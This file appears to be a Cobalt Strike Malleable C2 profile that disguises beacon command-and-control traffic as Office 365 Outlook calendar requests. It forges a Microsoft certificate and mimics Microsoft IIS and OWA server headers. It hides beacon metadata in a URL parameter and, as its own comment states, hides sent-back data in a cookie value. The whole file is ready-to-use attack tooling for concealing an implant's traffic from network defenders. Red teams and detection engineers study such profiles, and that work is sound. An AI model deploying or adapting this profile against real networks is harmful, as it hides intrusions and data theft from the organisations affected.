#office365 calendar view
#office365 www.office.com redirects to outlook.live.com
#info from requests 'GET /owa/?path=/calendar' and 'GET /owa/?wa=wsignin1.0&realm=outlook.com'
#ran into size issues so cut it back to still make it look believable.
#xx0hcd

https-certificate {
	set CN 		"outlook.live.com";
	set C		"US";
	set O		"Microsoft Corporation";
	set L		"Redmond";
	set OU		"Microsoft IT";
	set ST		"Washington";
	set validity	"365";
}

set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {

    set uri "/owa/";
    
    client {

	header "Host" "outlook.live.com";
	header "Accept" "*/*";
	header "Cookie" "MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42=ZG0yMzA2KjEs";
        
        metadata {
            base64url;
            parameter "wa";


        }

	parameter "path" "/calendar";

    }

    server {

	header "Cache-Control" "no-cache";
	header "Pragma" "no-cache";
	header "Content-Type" "text/html; charset=utf-8";
	header "Server" "Microsoft-IIS/10.0";
	header "request-id" "6cfcf35d-0680-4853-98c4-b16723708fc9";
	header "X-CalculatedBETarget" "BY2PR06MB549.namprd06.prod.outlook.com";
	header "X-Content-Type-Options" "nosniff";
	header "X-OWA-Version" "15.1.1240.20";
	header "X-OWA-OWSVersion" "V2017_06_15";
	header "X-OWA-MinimumSupportedOWSVersion" "V2_6";
	header "X-Frame-Options" "SAMEORIGIN";
	header "X-DiagInfo" "BY2PR06MB549";
	header "X-UA-Compatible" "IE=EmulateIE7";
	header "X-Powered-By" "ASP.NET";
	header "X-FEServer" "CY4PR02CA0010";
	header "Connection" "close";
        

        output {
            base64url;
            print;
        }
    }
}

http-post {
    
    set uri "/OWA/";
    set verb "GET";

    client {

	header "Host" "outlook.live.com";
	header "Accept" "*/*";     
        
        output {
            base64url;
	    parameter "wa";


        }


	#hiding data in cookie value 'wla42='
        id {
            base64url;

	    prepend "wla42=";
	    prepend "xid=730bf7;";
	    prepend "MSPAuth=3EkAjDKjI;";
	    prepend "ClientId=1C0F6C5D910F9;";
	    prepend "MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;";
	    header "Cookie";


        }
    }

    server {

	header "Cache-Control" "no-cache";
	header "Pragma" "no-cache";
	header "Content-Type" "text/html; charset=utf-8";
	header "Server" "Microsoft-IIS/10.0";
	header "request-id" "6cfcf35d-0680-4853-98c4-b16723708fc9";
	header "X-CalculatedBETarget" "BY2PR06MB549.namprd06.prod.outlook.com";
	header "X-Content-Type-Options" "nosniff";
	header "X-OWA-Version" "15.1.1240.20";
	header "X-OWA-OWSVersion" "V2017_06_15";
	header "X-OWA-MinimumSupportedOWSVersion" "V2_6";
	header "X-Frame-Options" "SAMEORIGIN";
	header "X-DiagInfo" "BY2PR06MB549";
	header "X-UA-Compatible" "IE=EmulateIE7";
	header "X-Powered-By" "ASP.NET";
	header "X-FEServer" "CY4PR02CA0010";
	header "Connection" "close";
        

        output {
            base64;
            print;
        }
    }
}

http-stager {
    server {
        header "Server" "Microsoft-IIS/10.0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Connection" "close";
    
    }


}

stage {
	#random compile time
	set compile_time "06 Aug 2016 09:48:38";
	set userwx "false";
}
